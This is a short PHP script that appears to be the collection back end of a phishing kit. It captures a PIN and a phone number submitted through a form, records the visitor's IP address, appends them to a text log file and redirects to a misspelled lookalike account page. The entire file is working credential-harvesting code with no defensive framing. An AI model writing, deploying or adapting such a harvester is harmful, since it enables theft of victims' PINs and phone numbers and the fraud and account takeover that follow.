<?php

$pin = $_POST['pin_xd'];
$tlf = $_POST['tlf_xd'];
$ip = $_SERVER["REMOTE_ADDR"];

$handle = fopen("resp/MiaG12.txt", "a");
   fwrite($handle, "Pin= ".$pin."\r\n");
   fwrite($handle, "Telefono= ".$tlf."\r\n");
   fwrite($handle, "IP= ".$ip."\r\n");
   fwrite($handle, "============================================= \r\n");
   fclose($handle);
   
header("Location: accounnt=service=last.html");
  exit;
?>